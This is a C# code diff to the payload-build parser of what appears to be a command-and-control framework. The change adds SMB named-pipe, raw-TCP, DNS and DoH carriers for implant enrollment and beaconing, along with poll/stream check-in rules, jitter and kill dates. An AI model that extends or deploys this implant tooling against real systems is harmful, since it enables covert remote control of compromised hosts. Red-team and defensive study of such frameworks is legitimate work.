@@ -94,8 +94,7 @@ internal static class PayloadBuildRequestParser
         // The check-in mode rides the beacon profile into the artifact: stream
         // (persistent, interactive) or poll (low-and-slow check-ins). A typo
         // must not silently build the interactive shape for an operator who
-        // asked for low-and-slow, so anything else is a 400. Parsed before the
-        // beacon: a transport whose beacon has no poll cycle refuses the pair.
+        // asked for low-and-slow, so anything else is a 400.
         var mode = body.Mode?.Trim().ToLowerInvariant();
         if (string.IsNullOrEmpty(mode))
             mode = "stream";
@@ -161,8 +160,7 @@ internal static class PayloadBuildRequestParser
             ParseDuration(body.JitterSeconds, DefaultJitter),
             body.KillDate,
             mode,
-            stage2,
-            DegradedChannels: body.DegradedChannels == true), null);
+            stage2), null);
     }
 
     // Exports the teamserver CA as the PEM the artifact pins: the implant's
@@ -224,6 +222,28 @@ internal static class PayloadBuildRequestParser
             if (Uri.TryCreate(quicEnroll, UriKind.Absolute, out var quicDial) && quicDial.Scheme == "quic")
                 return (quicEnroll, listener.Transport, null);
             return ($"quic://{quicEnroll}", listener.Transport, null);
+        }
+
+        // The socket family's enroll arm (Sec 8, enrollment over the stream
+        // check-in): an smb or tcp listener is enroll-nameable the same way
+        // -- the opening exchange on the pipe or socket carries the
+        // EnrollRequest frames -- and the baked endpoint is the transport's
+        // own dial: the pipe path in URL form, the host:port under tcp://.
+        if (listener.Transport is "smb" or "tcp")
+            return SocketDial(listener.Transport, listener.PublicEndpoint);
+
+        // The DNS family's enroll arm (Sec 8, enrollment over DNS -- the
+        // full-independence step for a DNS-only target): the enroll body
+        // uploads as chunked TXT queries and the answer chunks back down, so
+        // a dns or doh listener is enroll-nameable with the carrier pairing
+        // rules the beacon arm applies -- a wildcard bind names no resolver
+        // an implant can dial.
+        if (listener.Transport is "dns" or "doh")
+        {
+            var dial = DnsDial(listener);
+            if (dial.Error is { } dnsError)
+                return (null, null, dnsError);
+            return (dial.Dial, listener.Transport, null);
         }
 
         if (TransportProviders.Find(listener.Transport) is not KestrelEndpointProvider)
@@ -289,15 +309,30 @@ internal static class PayloadBuildRequestParser
             // with the fix rather than baked as one.
             if (listener.Transport is "dns" or "doh")
             {
-                var scheme = listener.Transport == "doh" ? "doh" : "dns";
-                var zone = listener.PublicEndpoint.Trim().TrimEnd('.').ToLowerInvariant();
-                var bind = listener.BindAddress.Trim();
-                if (bind.StartsWith("0.0.0.0:") || bind.StartsWith("[::]:") || bind.StartsWith(":::"))
+                if (mode != "poll")
                     return (null,
-                        $"A wildcard-bound {scheme} listener names no resolver an implant can dial; bind it "
-                        + "to a concrete interface, or type the dial manually under Advanced "
-                        + $"({scheme}://resolver:{(scheme == "doh" ? "443" : "53")}/{(zone.Length > 0 ? zone : "zone")}).");
-                return ($"{scheme}://{bind}/{zone}", null);
+                        $"The {listener.Transport} carrier is one-answer-one-poll; build it mode 'poll' "
+                        + "(the interactive verbs ride the polls store-and-forward), or name a web, mTLS, or QUIC front for a live stream.");
+                var dnsDial = DnsDial(listener);
+                if (dnsDial.Error is { } dnsError)
+                    return (null, dnsError);
+                return (dnsDial.Dial, null);
+            }
+            // The socket family's beacon arm (Sec 8): the named-pipe and
+            // raw-TCP listeners are poll-only carriers -- one connection is
+            // one check-in, the interactive verbs riding the cycles
+            // store-and-forward -- so a poll-mode build may name one and the
+            // baked beacon is the transport's own dial. A stream-mode naming
+            // is the incoherent pair (no live stream exists to hold),
+            // refused with the fix.
+            if (listener.Transport is "smb" or "tcp")
+            {
+                if (mode != "poll")
+                    return (null,
+                        $"The {listener.Transport} carrier is one-connection-one-check-in; build it mode 'poll' "
+                        + "(the interactive verbs ride the cycles store-and-forward), or name a web, mTLS, or QUIC front for a live stream.");
+                var (dial, _, dialError) = SocketDial(listener.Transport, listener.PublicEndpoint);
+                return (dial, dialError);
             }
             if (beaconProvider?.ServesNativeChannel != true)
                 return (null,
@@ -309,15 +344,11 @@ internal static class PayloadBuildRequestParser
                 return (BeaconAuthority(listener.PublicEndpoint), null);
             if (beaconProvider is KestrelEndpointProvider)
                 return (listener.PublicEndpoint, null);
-            // A socket-owning native dial (the QUIC stream): the session holds
-            // the stream for the connection's life, so it has no poll cycle to
-            // bake, and the bare host:port public endpoint completes with the
-            // transport's own scheme -- the URL shape the artifact's check-in
-            // client picks by.
-            if (mode == "poll")
-                return (null,
-                    $"The {listener.Transport} beacon holds one live session and has no poll cycle; "
-                    + "build it mode 'stream', or name a web front for the envelope cycle.");
+            // A socket-owning native dial (the QUIC stream): the bare
+            // host:port public endpoint completes with the transport's own
+            // scheme -- the URL shape the artifact's check-in client picks
+            // by. Either mode bakes: stream holds the session, poll ends
+            // each cycle on the client's idle window at the baked cadence.
             var quicEndpoint = listener.PublicEndpoint.Trim();
             if (Uri.TryCreate(quicEndpoint, UriKind.Absolute, out var quicDial)
                 && quicDial.Scheme == beaconProvider.PublicEndpointScheme)
@@ -355,12 +386,20 @@ internal static class PayloadBuildRequestParser
         // shape already dials without a split: the beacon stays unnamed and the
         // baked mode picks the client. A quic front's derived beacon is its
         // own session dial (the quic-schemed enroll endpoint carries no path
-        // to strip), so the poll refusal the named-beacon arm gives applies
-        // here too: the session has no poll cycle.
-        if (enrollTransport == "quic" && mode == "poll")
+        // to strip), and either mode bakes -- the client holds the session or
+        // cycles it on the idle window at the baked cadence.
+        // The poll-only families' derived shape: an smb, tcp, dns, or doh
+        // enroll front holds no live stream, so the walk's own mode gate
+        // applies here too -- stream mode names one the carrier does not
+        // hold.
+        if (enrollTransport is "smb" or "tcp" && mode != "poll")
             return (null,
-                "The quic beacon holds one live session and has no poll cycle; "
-                + "build it mode 'stream', or name a web front for the envelope cycle.");
+                $"The {enrollTransport} carrier is one-connection-one-check-in; build it mode 'poll' "
+                + "(the interactive verbs ride the cycles store-and-forward), or name a web, mTLS, or QUIC front for a live stream.");
+        if (enrollTransport is "dns" or "doh" && mode != "poll")
+            return (null,
+                $"The {enrollTransport} carrier is one-answer-one-poll; build it mode 'poll' "
+                + "(the interactive verbs ride the polls store-and-forward), or name a web, mTLS, or QUIC front for a live stream.");
         if (enrollTransport is not null
             && TransportProviders.Find(enrollTransport) is KestrelEndpointProvider { Posture: ListenerTlsPosture frontMutual }
             && frontMutual == ListenerTlsPosture.MutualAsk
@@ -467,14 +506,59 @@ internal static class PayloadBuildRequestParser
             ? TimeSpan.FromSeconds(Math.Min(value, MaxDurationSeconds))
             : fallback;
 
-    // An endpoint the implant can dial: an absolute http(s) URL, or the QUIC
-    // dial (architecture.md Sec 8, enrollment over QUIC -- a quic-schemed
-    // enroll endpoint runs the frame exchange, and the egress walk treats
-    // every entry as a URL). A bare host or a typo'd scheme strands the
-    // payload on target.
+    // An endpoint the implant can dial: an absolute http(s) URL, or the QUIC,
+    // socket, or DNS family's dial (architecture.md Sec 8 -- a quic-, tcp-,
+    // smb-, dns-, or doh-schemed enroll endpoint runs the frame or chunk
+    // exchange its module dials, and the egress walk treats every entry as a
+    // URL). A bare host or a typo'd scheme strands the payload on target.
     private static bool IsDialableEndpoint(string text)
         => Uri.TryCreate(text.Trim(), UriKind.Absolute, out var uri)
             && (uri.Scheme == Uri.UriSchemeHttp
                 || uri.Scheme == Uri.UriSchemeHttps
-                || uri.Scheme.Equals("quic", StringComparison.OrdinalIgnoreCase));
+                || uri.Scheme.Equals("quic", StringComparison.OrdinalIgnoreCase)
+                || uri.Scheme.Equals("tcp", StringComparison.OrdinalIgnoreCase)
+                || uri.Scheme.Equals("smb", StringComparison.OrdinalIgnoreCase)
+                || uri.Scheme.Equals("dns", StringComparison.OrdinalIgnoreCase)
+                || uri.Scheme.Equals("doh", StringComparison.OrdinalIgnoreCase));
+
+    // The DNS family's baked dial (Sec 8), shared by the enroll and beacon
+    // arms: the listener's own bind as the resolver plus its zone, the dial
+    // shape the implant's DNS client parses. A wildcard bind names no
+    // dialable resolver, so it is refused with the fix rather than baked as
+    // one.
+    private static (string? Dial, string? Error) DnsDial(Rod.Transport.Listeners.Listener listener)
+    {
+        var scheme = listener.Transport == "doh" ? "doh" : "dns";
+        var zone = listener.PublicEndpoint.Trim().TrimEnd('.').ToLowerInvariant();
+        var bind = listener.BindAddress.Trim();
+        if (bind.StartsWith("0.0.0.0:") || bind.StartsWith("[::]:") || bind.StartsWith(":::"))
+            return (null,
+                $"A wildcard-bound {scheme} listener names no resolver an implant can dial; bind it "
+                + "to a concrete interface, or type the dial manually under Advanced "
+                + $"({scheme}://resolver:{(scheme == "doh" ? "443" : "53")}/{(zone.Length > 0 ? zone : "zone")}).");
+        return ($"{scheme}://{bind}/{zone}", null);
+    }
+
+    // The socket family's baked dial (Sec 8, enrollment over the stream
+    // check-in): the raw-TCP listener's host:port public endpoint completes
+    // under tcp://, and the smb listener's pipe path (\\host\pipe\name)
+    // becomes the URL form smb://host/pipe/name -- a dot host naming the
+    // local machine.
+    private static (string? Value, string? Transport, string? Error) SocketDial(string transport, string publicEndpoint)
+    {
+        var trimmed = publicEndpoint.Trim();
+        if (transport == "tcp")
+        {
+            if (Uri.TryCreate(trimmed, UriKind.Absolute, out var dial) && dial.Scheme == "tcp")
+                return (trimmed, transport, null);
+            return ($"tcp://{trimmed}", transport, null);
+        }
+
+        var parts = trimmed.TrimStart('\\').Split('\\');
+        if (parts.Length < 3 || !string.Equals(parts[1], "pipe", StringComparison.OrdinalIgnoreCase))
+            return (null, transport,
+                $"The smb listener's public endpoint must be the pipe path implants dial (\\\\host\\pipe\\name), got '{publicEndpoint}'.");
+        var pipeName = string.Join('/', parts.Skip(2));
+        return ($"smb://{parts[0]}/pipe/{pipeName}", transport, null);
+    }
 }
